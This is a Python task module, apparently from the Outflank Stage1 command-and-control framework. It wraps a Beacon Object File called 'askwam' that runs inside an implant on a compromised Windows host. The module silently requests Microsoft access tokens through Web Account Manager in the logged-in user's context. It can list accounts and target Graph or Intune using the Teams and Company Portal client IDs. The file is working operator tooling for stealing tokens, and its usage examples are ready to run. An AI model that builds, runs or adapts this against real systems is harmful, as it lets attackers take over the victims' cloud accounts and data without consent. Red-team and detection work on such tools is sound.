from typing import List, Tuple

from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


class AskWamBOF(BaseBOFTask):
    """Silently request a token from Windows WAM."""

    def __init__(self):
        super().__init__("askwam", base_binary_name="askwam_bof")

        self.parser.description = (
            "Silently request an access token from Windows Web Account Manager "
            "(WAM). Runs inline in the current process and user context via "
            "WinRT COM. No MSAL, .NET, or cache access required."
        )

        self.parser.add_argument(
            "--client-id", default="",
            help="Public client ID (default: Teams desktop/mobile)"
        )
        self.parser.add_argument(
            "--scope", default="",
            help="Requested v2 scope (default: Graph .default)"
        )
        self.parser.add_argument(
            "--resource", default="",
            help="WAM v1-compatible resource; mutually exclusive with --scope"
        )
        self.parser.add_argument(
            "--authority", default="",
            help="Provider authority (default: organizations)"
        )
        self.parser.add_argument(
            "--claims-json", default="",
            help="Raw OAuth claims JSON object; mutually exclusive with --cae"
        )
        self.parser.add_argument(
            "--account-id", default="",
            help="Select an exact WAM account ID"
        )
        self.parser.add_argument(
            "--username", default="",
            help="Select one exact, unique username"
        )
        self.parser.add_argument(
            "--timeout-seconds", type=int, default=30,
            help="Silent-operation timeout, 1-300 (default: 30)"
        )
        self.parser.add_argument(
            "--hide", action="store_true",
            help="Omit the access token from output"
        )
        self.parser.add_argument(
            "--cae", action="store_true",
            help="Request the CAE cp1 capability; mutually exclusive with --claims-json"
        )
        self.parser.add_argument(
            "--enum", action="store_true",
            help="Enumerate WAM accounts and exit without requesting a token"
        )

        self.parser.epilog = (
            "Example usage:\n"
            "  askwam --enum\n"
            "  askwam --account-id <id-from-enum>\n"
            "  askwam --username user@example.com\n"
            "  askwam --resource https://graph.microsoft.com --hide\n"
            "  askwam --cae\n"
            "  askwam --cae --hide\n"
            '  askwam --claims-json {"access_token":{"xms_cc":{"values":["cp1"]}}}\n\n'
            "Intune token (Company Portal client ID, Intune resource):\n"
            "  askwam --client-id 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223 "
            "--resource 0000000a-0000-0000-c000-000000000000\n\n"
            "Notes:\n"
            "  --scope and --resource are mutually exclusive.\n"
            "  --cae and --claims-json are mutually exclusive.\n"
            "  --account-id and --username are mutually exclusive.\n"
            "  x64 implants only.\n"
        )

    def validate_arguments(self, arguments: List[str]):
        super().validate_arguments(arguments)

        args = self.parser.parse_args(arguments)

        if args.scope and args.resource:
            raise TaskInvalidArgumentsException(
                "Use either --scope or --resource, not both"
            )
        if args.account_id and args.username:
            raise TaskInvalidArgumentsException(
                "Use either --account-id or --username, not both"
            )
        if args.cae and args.claims_json:
            raise TaskInvalidArgumentsException(
                "Use either --cae or --claims-json, not both"
            )
        if args.enum and (args.account_id or args.username):
            raise TaskInvalidArgumentsException(
                "--enum cannot be combined with an account selector"
            )
        if args.timeout_seconds < 1 or args.timeout_seconds > 300:
            raise TaskInvalidArgumentsException(
                f"Timeout must be 1-300, got {args.timeout_seconds}"
            )

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str]]:
        args = self.parser.parse_args(arguments)

        # BOF expects: zzzzzzziiii
        return [
            (BOFArgumentEncoding.STR, args.client_id),
            (BOFArgumentEncoding.STR, args.scope),
            (BOFArgumentEncoding.STR, args.resource),
            (BOFArgumentEncoding.STR, args.authority),
            (BOFArgumentEncoding.STR, args.claims_json),
            (BOFArgumentEncoding.STR, args.account_id),
            (BOFArgumentEncoding.STR, args.username),
            (BOFArgumentEncoding.INT, args.timeout_seconds),
            (BOFArgumentEncoding.INT, 1 if args.hide else 0),
            (BOFArgumentEncoding.INT, 1 if args.cae else 0),
            (BOFArgumentEncoding.INT, 1 if args.enum else 0),
        ]

    def run(self, arguments: List[str]):
        args = self.parser.parse_args(arguments)

        if args.enum:
            self.append_response("Enumerating Windows WAM accounts...\n")
        else:
            self.append_response(
                "Requesting a token silently through Windows WAM...\n"
            )

        super().run(arguments)
